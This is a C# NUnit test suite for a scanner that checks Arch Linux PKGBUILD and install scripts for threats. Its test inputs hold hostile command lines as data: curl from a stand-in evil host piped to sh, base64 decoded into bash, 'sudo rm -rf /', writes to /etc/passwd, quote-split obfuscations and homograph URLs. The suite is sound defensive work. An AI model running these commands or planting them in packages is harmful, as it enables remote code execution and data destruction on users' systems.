using System.Text;
using Atoll.Api.Services.Security;
using NUnit.Framework;

namespace Atoll.Api.Tests.Security;

public class PkgBuildSecurityScannerTests
{
    // Regression fixture from the Shelly 3.0.1+1 PKGBUILD. It includes the
    // real source declaration, build/check functions, and package-script patterns
    // that are relevant to the scanner.
    private const string ShellyPkgbuild =
        """
        # Maintainer: Zoey Bauer <zoey.erin.bauer@gmail.com>
        # Maintainer: Caroline Snyder <hirpeng@gmail.com>
        pkgbase=shelly
        pkgname=('shelly' 'shelly-flatpak-backend')
        pkgver=3.0.1+1
        pkgrel=2
        arch=('x86_64')
        url="https://github.com/Seafoam-Labs/Shelly-ALPM"
        license=('GPL-3.0-only')
        makedepends=('git' 'pkgconf' 'gtk4' 'zig>=0.16' 'clang' 'gettext' 'vala' 'meson' 'ninja' 'flatpak' 'ripgrep')

        source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Seafoam-Labs/Shelly-ALPM/archive/v${pkgver}.tar.gz")
        sha256sums=('f7e4b35e7d07bc9cfc95b4a923e22889356f7f98d06d3bdebfc7bc4b8729e80c')
        _source_dir="Shelly-ALPM-${pkgver//+/-}"

        build() {
          cd "$srcdir/${_source_dir}"

          (cd Shelly.Flatpak.Backend && zig build --verbose \
            --prefix "${srcdir}/${_source_dir}/out-flatpak-backend" \
            --cache-dir "${srcdir}/zig-cache" \
            --global-cache-dir "${srcdir}/zig-global-cache" \
            -Dcpu=baseline \
            -Doptimize=ReleaseSafe)

          (cd Shelly.Ui.Gtk && zig build --verbose \
            --prefix "${srcdir}/${_source_dir}/out" \
            --cache-dir "${srcdir}/zig-cache" \
            --global-cache-dir "${srcdir}/zig-global-cache" \
            -Dflatpak-backend-package=shelly-flatpak-backend \
            -Dcpu=baseline \
            -Doptimize=ReleaseSafe)

          meson setup --prefix=/usr build-notify Shelly.Notifications
          meson compile -C build-notify

          ./out-cli/bin/shelly utility --completions bash > shelly.bash
          ./out-cli/bin/shelly utility --completions fish > shelly.fish
          ./out-cli/bin/shelly utility --completions zsh > _shelly

          for po_file in Shelly.Ui.Gtk/po/*.po; do
            [ -f "$po_file" ] || continue
            lang=$(basename "$po_file" .po)
            msgfmt "$po_file" -o "shelly-ui-${lang}.mo"
          done

          for po_file in Shelly.Notifications/po/*.po; do
            [ -f "$po_file" ] || continue
            lang=$(basename "$po_file" .po)
            msgfmt "$po_file" -o "shelly-notifications-${lang}.mo"
          done
        }

        check() {
          cd "$srcdir/${_source_dir}"
          (cd Shelly.Flatpak.Backend && zig build test abi-test integration-test \
            --cache-dir "${srcdir}/zig-cache" \
            --global-cache-dir "${srcdir}/zig-global-cache")
          scripts/check-flatpak-separation.sh \
            out-cli/bin/shelly \
            out-flatpak-backend/lib/libshelly-flatpak-backend.so.1
        }

        package_shelly() {
          pkgdesc="Shelly: A Modern Arch Package Manager"
          depends=('pacman' 'gtk4' 'glib2' 'sudo' 'tar' 'bash' 'git' 'dbus' 'glibc')
          optdepends=('shelly-flatpak-backend: Flatpak package management support')

          cd "$srcdir/${_source_dir}"
          install -Dm755 out-cli/bin/shelly "$pkgdir/usr/bin/shelly"
          install -Dm644 shelly.bash "$pkgdir/usr/share/bash-completion/completions/shelly"

          cat <<'EOF' | install -Dm644 /dev/stdin "$pkgdir/usr/share/polkit-1/actions/com.shellyorg.shelly.policy"
        <policyconfig>
          <action id="com.shellyorg.shelly.pkexec.cli">
            <annotate key="org.freedesktop.policykit.exec.path">/usr/bin/shelly</annotate>
          </action>
        </policyconfig>
        EOF

          for mo_file in shelly-ui-*.mo; do
            if [ -f "$mo_file" ]; then
              lang=$(echo "$mo_file" | sed 's/shelly-ui-\(.*\)\.mo/\1/')
              install -Dm644 "$mo_file" "$pkgdir/usr/share/locale/$lang/LC_MESSAGES/shelly-ui.mo"
            fi
          done

          cat <<'SCRIPT' | install -Dm755 /dev/stdin "$pkgdir/usr/bin/shelly-flatpak-integrate"
        #!/bin/bash
        FLATPAK_DIRS=("/var/lib/flatpak/exports/share/applications" "$HOME/.local/share/flatpak/exports/share/applications")
        LOCAL_APPS_DIR="$HOME/.local/share/applications"
        mkdir -p "$LOCAL_APPS_DIR"
        for dir in "${FLATPAK_DIRS[@]}"; do
            [ -d "$dir" ] || continue
            for desktop_file in "$dir"/*.desktop; do
                [ -f "$desktop_file" ] || continue
                dest="$LOCAL_APPS_DIR/$(basename "$desktop_file")"
                [ -f "$dest" ] || cp "$desktop_file" "$dest"
                grep -q "ShellyManage" "$dest" && continue
            done
        done
        SCRIPT
        }

        package_shelly-flatpak-backend() {
          pkgdesc="Optional native Flatpak backend for Shelly"
          depends=("shelly=${pkgver}" 'flatpak')
          install -Dm755 out-flatpak-backend/lib/libshelly-flatpak-backend.so.1.0.0 \
            "$pkgdir/usr/lib/shelly/libshelly-flatpak-backend.so.1.0.0"
        }
        """;

    private static PkgBuildSecurityScanner CreateScanner()
    {
        return new PkgBuildSecurityScanner();
    }

    private static ScanResult Scan(params (string Path, string Content)[] files)
    {
        return CreateScanner().Scan(files.ToDictionary(f => f.Path, f => f.Content));
    }

    [Test]
    public void Clean_pkgbuild_has_no_findings_and_verifies()
    {
        var result = Scan(("PKGBUILD", "pkgname=foo\npkgver=1.0\nsource=(\"https://example.com/foo.tar.gz\")\n"));

        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(result.Findings, Is.Empty);
    }

    [Test]
    public void Curl_piped_to_sh_is_critical_and_flags()
    {
        var result = Scan(("PKGBUILD", "curl https://evil.example/x.sh | sh\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
        Assert.That(result.Findings.First(f => f.RuleId == "network-to-shell").Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Base64_piped_to_shell_is_critical()
    {
        var result = Scan(("PKGBUILD", "echo 'aGVsbG8=' | base64 -d | bash\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "decode-to-shell"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Obfuscated_curl_sh_is_detected_after_normalization()
    {
        var result = Scan(("PKGBUILD", "c''u''rl https://evil.example/x.sh | s''h\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
    }

    [Test]
    public void Write_to_etc_is_high_and_flags()
    {
        var result = Scan(("PKGBUILD", "echo pwned > /etc/passwd\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "write-outside-build-root"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Sudo_is_high_and_flags()
    {
        var result = Scan(("PKGBUILD", "sudo rm -rf /\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Command_substitution_is_medium_and_does_not_block()
    {
        var result = Scan(("PKGBUILD", "pkgver=$(date +%s)\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "command-substitution"), Is.True);
        Assert.That(result.Findings.First(f => f.RuleId == "command-substitution").Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Install_scriptlet_is_scanned()
    {
        var result = Scan(("foo.install", "post_install() { curl https://evil.example/x | bash; }\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-to-shell"), Is.True);
    }

    [Test]
    public void Privilege_escalation_in_install_scriptlet_is_medium_and_does_not_block()
    {
        // Scriptlets already run as root under alpm's control: sudo inside one is
        // redundant, not an escalation.
        var result = Scan(("foo.install", "post_install() {\n  sudo systemctl enable foo.service\n}\n"));

        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Write_outside_build_root_in_install_scriptlet_is_medium_and_does_not_block()
    {
        var result = Scan(("foo.install", "post_install() {\n  echo /bin/zsh >> /etc/shells\n}\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Obfuscated_write_in_install_scriptlet_is_medium_and_does_not_block()
    {
        // upak regression: the \/root artifact escalated to Critical before the scriptlet
        // context was taken into account.
        var result = Scan(("upak.install", "echo \"/opt/x/upak/doc\" > \\/root/upak_help_path\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Privilege_escalation_in_helper_script_still_flags()
    {
        // Helper scripts run outside alpm's control - only .install scriptlets are the
        // already-root context.
        var result = Scan(("setup.sh", "sudo systemctl enable foo.service\n"));

        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Write_outside_build_root_in_helper_script_still_flags()
    {
        var result = Scan(("setup.sh", "echo x > /etc/foo.conf\n"));

        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Heredoc_help_text_mentioning_sudo_does_not_block()
    {
        var result = Scan(("PKGBUILD", "cat <<'EOF'\n## After editing run: sudo systemctl restart foo\nEOF\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Quoted_uninstall_instructions_in_scriptlet_do_not_block()
    {
        // Help text printed for the user: the pipe sits inside a quoted string, so
        // nothing is actually piped into a shell.
        var result = Scan(("foo.install",
            "post_remove() {\n  echo \"    curl -fsSL https://example.com/uninstall.sh | bash -s -- --purge --yes\"\n}\n"));

        Assert.That(
            result.Findings.Any(f => f.RuleId is "network-to-shell" or "network-execution" or "decode-to-shell"),
            Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Perl_release_tag_scraping_does_not_block()
    {
        // perl runs its inline -pe program on the download as stdin data; the fetch
        // itself stays visible as a Medium risky-tool finding.
        var result = Scan(("aur-cfg.sh",
            "get_pkgver() {\n  curl -s https://example.com/releases/latest | perl -pe 's!.*/tag/v?([0-9].+)!!'\n}\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "network-execution"), Is.False);
        Assert.That(result.Findings.Any(f => f.RuleId == "risky-tool"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Answer_feeding_local_installer_does_not_block()
    {
        // bash executes the local script file; the piped answer is only its stdin data.
        var result = Scan(("PKGBUILD", "package() {\n  echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null\n}\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "decode-to-shell"), Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Network_pipe_inside_quoted_substitution_still_flags()
    {
        var result = Scan(("PKGBUILD", "echo \"$(curl https://evil.example/x | sh)\"\n"));

        var finding = result.Findings.First(f => f.RuleId == "network-to-shell");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Non_script_binary_file_is_not_scanned()
    {
        var result = Scan(("data.bin", "curl https://evil.example/x | sh\n"));

        Assert.That(result.Findings, Is.Empty);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Local_elf_is_critical_while_binary_data_is_medium()
    {
        // Repository files reach the scanner as UTF-8-decoded strings, so decode
        // real on-disk bytes instead of relying on string escapes. This mirrors
        // how PackageService / AurMirror hand content to the scanner.
        var elf = Encoding.UTF8.GetString([0x7F, 0x45, 0x4C, 0x46, .. Encoding.UTF8.GetBytes("payload")]);
        var binary = "abc\0def";

        var result = Scan(
            ("tool", elf),
            ("data.bin", binary),
            ("script.sh", "#!/bin/sh\necho ok\n"));

        var findings = result.Findings.Where(f => f.RuleId == "local-binary").ToList();
        Assert.That(findings, Has.Count.EqualTo(2));
        Assert.That(findings[0].Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(findings[0].Message, Does.Contain("ELF executable"));
        Assert.That(findings[0].Snippet, Is.EqualTo("tool"));
        Assert.That(findings[1].Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(findings[1].Message, Does.Contain("binary data"));
        Assert.That(findings[1].Snippet, Is.EqualTo("data.bin"));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Local_source_file_with_only_invalid_utf8_is_retained_medium()
    {
        // A lone continuation byte (0x80) is not valid UTF-8 and decodes to the
        // replacement character (U+FFFD). With no NUL or control characters present the
        // file is treated as text in an unrecognized encoding: retained, non-blocking.
        var invalid = Encoding.UTF8.GetString([0x41, 0x80, 0x42]);

        var result = Scan(("blob", invalid));

        var finding = result.Findings.Single(f => f.RuleId == "local-binary");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("unrecognized encoding"));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Scanner_is_deterministic()
    {
        var files = new[] { ("PKGBUILD", "curl https://evil.example/x.sh | sh\n") };
        var first = Scan(files);
        var second = Scan(files);

        Assert.That(second.Findings.Select(f => f.RuleId), Is.EqualTo(first.Findings.Select(f => f.RuleId)));
    }

    [Test]
    public void Obfuscated_privilege_escalation_is_escalated_to_critical()
    {
        // sudo is split with empty quotes, so it is invisible to a plain grep
        // but visible after deobfuscation.
        var result = Scan(("PKGBUILD", "s''u''d''o rm -rf /\n"));

        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Plain_privilege_escalation_remains_high()
    {
        var result = Scan(("PKGBUILD", "sudo rm -rf /\n"));

        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
    }

    [Test]
    public void Run0_and_sudoedit_and_bare_su_are_privilege_escalation()
    {
        var run0 = Scan(("PKGBUILD", "run0 systemctl stop pacman\n"));
        var sudoedit = Scan(("PKGBUILD", "sudoedit /etc/sudoers\n"));
        var su = Scan(("PKGBUILD", "su root -c 'evil'\n"));

        Assert.That(run0.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
        Assert.That(sudoedit.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
        Assert.That(su.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
    }

    [Test]
    public void Privilege_escalation_is_not_triggered_by_substring_matches()
    {
        // "sudo" is a substring of these words but must not be flagged.
        var result = Scan(("PKGBUILD", "echo pseudo sudoku\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
    }

    [Test]
    public void Privilege_escalation_inside_echo_string_is_not_flagged()
    {
        // The tool name is display text inside a quoted string, not an invocation.
        var result = Scan(("PKGBUILD", "msg2 \"        sudo usermod -a -G flutter [username]\"\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
    }

    [Test]
    public void Privilege_escalation_inside_single_quoted_string_is_not_flagged()
    {
        var result = Scan(("PKGBUILD", "echo 'run: sudo groupdel flutter'\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
    }

    [Test]
    public void Privilege_escalation_in_command_substitution_inside_quotes_is_flagged()
    {
        // "$(sudo ...)" inside double quotes IS executed by the shell.
        var result = Scan(("PKGBUILD", "echo \"result: $(sudo whoami)\"\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.True);
    }

    [Test]
    public void Risky_tool_inside_echo_string_is_not_flagged()
    {
        var result = Scan(("PKGBUILD", "echo \"Run: curl http://example.com | sh to install\"\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "risky-tool" && f.Snippet.Contains("curl")), Is.False);
    }

    [Test]
    public void Zero_width_character_is_flagged_as_medium_and_does_not_block()
    {
        // \u200B is a zero-width space embedded inside "rm". It cannot change how the shell
        // tokenizes the line, so it is review-only.
        var result = Scan(("PKGBUILD", "echo rm\u200Brf\n"));

        var finding = result.Findings.First(f => f.RuleId == "hidden-character");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Bidi_override_is_flagged_as_critical()
    {
        // U+202E (RIGHT-TO-LEFT OVERRIDE) can flip the visual order of text.
        var result = Scan(("PKGBUILD", "pkgname=evil\u202Esh\n"));

        var finding = result.Findings.FirstOrDefault(f => f.RuleId == "hidden-character");
        Assert.That(finding, Is.Not.Null);
        Assert.That(finding!.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [Test]
    public void Plain_ascii_pkgbuild_has_no_hidden_character_findings()
    {
        var result = Scan(("PKGBUILD", "pkgname=foo\npkgver=1.0\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "hidden-character"), Is.False);
    }

    [Test]
    public void Variable_indirection_is_medium_and_does_not_block()
    {
        var result = Scan(("PKGBUILD", "cmd=${!target}\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "variable-indirection"), Is.True);
        Assert.That(
            result.Findings.First(f => f.RuleId == "variable-indirection").Severity,
            Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Obfuscated_network_execution_is_escalated_to_critical()
    {
        // Both the downloader and the target interpreter are split with empty
        // quotes, so neither is visible to a plain text search. network-execution
        // is normally High; obfuscation escalates it to Critical.
        var result = Scan(("PKGBUILD", "c''url https://evil.example/x | p''ython evil.py\n"));

        var finding = result.Findings.First(f => f.RuleId == "network-execution");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Plain_network_execution_remains_high()
    {
        var result = Scan(("PKGBUILD", "curl https://evil.example/x | python evil.py\n"));

        var finding = result.Findings.First(f => f.RuleId == "network-execution");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
    }

    [Test]
    public void Shelly_pkgbuild_is_verified_with_only_expected_command_substitution_findings()
    {
        // The fourth historical finding - $(basename ...) inside the <<'SCRIPT' heredoc
        // body - is suppressed: a quoted delimiter makes the body literal data.
        var result = Scan(("PKGBUILD", ShellyPkgbuild));

        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(result.Findings, Has.Count.EqualTo(3));
        Assert.That(result.Findings, Is.All.Matches<SecurityFinding>(f =>
            f is { RuleId: "command-substitution", Severity: FindingSeverity.Medium }));
    }

    [Test]
    public void Command_substitution_in_single_quoted_grep_argument_does_not_block()
    {
        var result = Scan(("PKGBUILD", "grep -F '$(BUILD_FLAGS)' config\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "command-substitution"), Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Quoted_echo_redirect_text_does_not_block()
    {
        var result = Scan(("PKGBUILD", "echo \" >> /etc/mkinitcpio.conf.\"\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Quoted_escaped_tool_mention_does_not_block()
    {
        // The corpus false-positive class: echo'd instructions containing \$(sudo ...)
        // used to escalate to Critical via escape stripping. The backslash prevents
        // execution, so the tool name is display text and no longer flagged at all.
        var result = Scan(("PKGBUILD", "echo \"then run: \\$(sudo whoami)\"\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Escaped_substitution_inside_double_quotes_is_retained_medium_but_not_critical()
    {
        // $( only appears after normalization drops the backslashes; it stays a
        // non-blocking Medium finding instead of escalating to Critical.
        var result = Scan(("PKGBUILD", "echo \"$\\(date\\)\"\n"));

        var finding = result.Findings.Single(f => f.RuleId == "command-substitution");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Inert_media_source_files_are_medium_and_do_not_block()
    {
        var png = Encoding.UTF8.GetString([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, .. new byte[16]]);
        var pdf = "%PDF-1.7\nstream\n\0\0binary\nendstream\n";
        var font = Encoding.UTF8.GetString([0x00, 0x01, 0x00, 0x00, .. new byte[16]]);

        var result = Scan(
            ("icon.png", png),
            ("manual.pdf", pdf),
            ("font.ttf", font),
            ("PKGBUILD", "pkgname=foo\n"));

        var findings = result.Findings.Where(f => f.RuleId == "local-binary").ToList();
        Assert.That(findings, Has.Count.EqualTo(3));
        Assert.That(findings, Is.All.Matches<SecurityFinding>(f => f.Severity == FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Unrecognized_binary_source_files_are_medium_and_do_not_block()
    {
        // Only recognized executable formats (ELF, PE) block; opaque binary data is
        // retained for review at Medium.
        var result = Scan(("payload.bin", "abc\0def\n"));

        var finding = result.Findings.Single(f => f.RuleId == "local-binary");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Non_utf8_text_files_are_medium_and_do_not_block()
    {
        // Only undecodable bytes (U+FFFD), no NUL/control characters: legacy encodings.
        var legacy = Encoding.UTF8.GetString([0x41, 0x80, 0x42, 0x0A]);

        var result = Scan(("notes.txt", legacy), ("PKGBUILD", "pkgname=foo\n"));

        var finding = result.Findings.Single(f => f.RuleId == "local-binary");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Homograph_url_with_invisible_character_is_high_and_flags()
    {
        // Corpus regression fixture (poweriso-gui): U+0670, an invisible combining mark,
        // is prepended to the url scheme. The package looks clean on inspection.
        var result = Scan(("PKGBUILD", "pkgname=foo\nurl=\"\u0670http://www.poweriso.com/download.htm\"\n"));

        var finding = result.Findings.Single(f => f.RuleId == "homograph");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(finding.Message, Does.Contain("U+0670"));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Homograph_lookalike_source_host_is_high_and_flags()
    {
        // Cyrillic i (U+0456) spoofing the host of a download URL.
        var result = Scan(("PKGBUILD", "pkgname=foo\nsource=(\"https://g\u0456thub.com/foo/foo-1.0.tar.gz\")\n"));

        var finding = result.Findings.Single(f => f.RuleId == "homograph");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Homograph_typosquatted_dependency_is_high_and_flags()
    {
        // depends inside a split-package function is indented but still checked.
        var result = Scan(("PKGBUILD", "package() {\n  depends=('pacman' '\u0440acman-git')\n}\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.True);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }

    [Test]
    public void Benign_non_ascii_outside_metadata_values_does_not_block()
    {
        // Non-ASCII in comments and pkgdesc is legitimate; the homograph checks only
        // inspect the extracted pkgname/depends/makedepends/url/source values.
        var result = Scan(("PKGBUILD",
            "# 中文注释：构建时需要网络\n" +
            "pkgname=foo\n" +
            "pkgdesc=\"Ün outil avec des accents — 日本語の説明文\"\n" +
            "source=(\"https://example.com/foo.tar.gz\")\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Legitimate_accented_source_filename_does_not_block()
    {
        var result = Scan(("PKGBUILD", "pkgname=foo\nsource=(\"https://example.com/1.6_Versi\u00F3n.tar.gz\")\n"));

        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.False);
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public void Intra_word_quote_split_download_is_flagged()
    {
        var result = Scan(("PKGBUILD", "c'u'rl https://evil.example/x.sh | sh\n"));

        var finding = result.Findings.First(f => f.RuleId == "network-to-shell");
        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
    }
}